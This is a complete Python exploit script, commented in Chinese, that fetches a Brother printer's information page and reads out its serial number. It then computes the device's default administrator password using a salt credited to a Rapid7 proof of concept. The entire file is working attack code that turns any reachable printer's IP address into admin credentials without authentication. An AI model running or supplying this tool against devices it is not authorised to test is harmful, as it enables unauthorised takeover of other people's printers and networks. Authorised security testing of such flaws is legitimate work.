#!/usr/bin/env python3
"""
brother_info_pwd.py  –  0-click dump + default password calculator
---------------------------------------------------------------
• HTTPS (verify=False) ；預設埠 443，改埠用 -p
• 先抓 /general/information.html?kind=item
  └ 找 <dl class="items">，擷取 <dt>/<dd>
• 從 Serial 取前 16 byte → 內建 Rapid7 PoC 鹽值 → 算出 8-char 密碼
Usage:
    python brother_info_pwd.py 192.168.7.16
    python brother_info_pwd.py 192.168.7.16 -p 60443
"""

import argparse, base64, hashlib, html, re, sys, requests, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────── 0.  內建 salt 查表（PoC 需要的兩筆） ────────────
salt_lookup_table = [0] * 256
salt_lookup_table[254] = 8
salt_data_table = [b""] * 256
salt_data_table[8] = b"7HOLDhk'"

# ──────────── 1.  抓 HTML ─────────────────────────────────────
def fetch_page(ip: str, port: int) -> str:
    url = f"https://{ip}:{port}/general/information.html?kind=item"
    r = requests.get(url, timeout=10, verify=False)
    r.raise_for_status()
    return r.text

# ──────────── 2.  解析 Node Information ──────────────────────
TAG = re.compile(r"<[^>]+>")
DTDD = re.compile(r"<dt[^>]*>(.*?)</dt>\s*<dd[^>]*>(.*?)</dd>", re.I | re.S)

def clean(txt: str) -> str:
    txt = TAG.sub("", txt)
    txt = html.unescape(txt).replace("\xa0", " ")
    return txt.strip()

def parse_node_info(html_text: str) -> dict:
    # 先找含 Node & Information 的 <h3>
    m = re.search(r"<h3[^>]*>(.*?)</h3>(.*?)</dl>", html_text, re.I | re.S)
    if not m:
        # fallback: 第一個 <dl class="items">
        m = re.search(r"<dl[^>]*class=[\"'][^\"']*items[^\"']*[\"'][^>]*>(.*?)</dl>",
                      html_text, re.I | re.S)
    if not m:
        return {}
    block = m.group(0)
    info = {}
    for dt, dd in DTDD.findall(block):
        k, v = clean(dt), clean(dd)
        if k:
            info[k] = v
    return info

# ──────────── 3.  預設密碼演算法 ─────────────────────────────
TRANS = str.maketrans({"l": "#", "I": "$", "z": "%", "Z": "&",
                       "b": "*", "q": "-", "O": ":", "o": "?",
                       "v": "@", "y": ">"})

def generate_default_password(serial: str, idx: int = 254) -> str:
    serial_bytes = serial.encode("ascii")[:16]
    salt_src = salt_data_table[salt_lookup_table[idx]]
    salt_bytes = bytes((salt_src[::-1][i] - 1) & 0xFF for i in range(8))
    digest_b64 = base64.b64encode(hashlib.sha256(serial_bytes + salt_bytes).digest()).decode()
    return digest_b64[:8].translate(TRANS)

# ──────────── 4.  CLI ────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="Brother info + default-password dumper")
    ap.add_argument("ip", help="Printer IP / FQDN")
    ap.add_argument("-p", "--port", type=int, default=443, help="TCP port (default 443)")
    args = ap.parse_args()

    try:
        html_text = fetch_page(args.ip, args.port)
        info = parse_node_info(html_text)
    except Exception as e:
        sys.exit(f"[!] HTTP failed: {e}")

    if not info:
        sys.exit("[!] Node Information not found – device structure differs or blocked.")

    # 列印 Node Information
    for k in ("Model Name", "Serial No.", "Serial no.", "Main Firmware Version",
              "Sub1 Firmware Version", "Memory Size"):
        if k in info:
            print(f"{k:<24}: {info[k]}")

    # 取序號並計算預設密碼
    serial = info.get("Serial no.") or info.get("Serial No.")
    if serial:
        pwd = generate_default_password(serial)
        print(f"Default Password         : {pwd}")
    else:
        print("[!] Serial number not found – cannot compute default password.")

if __name__ == "__main__":
    main()
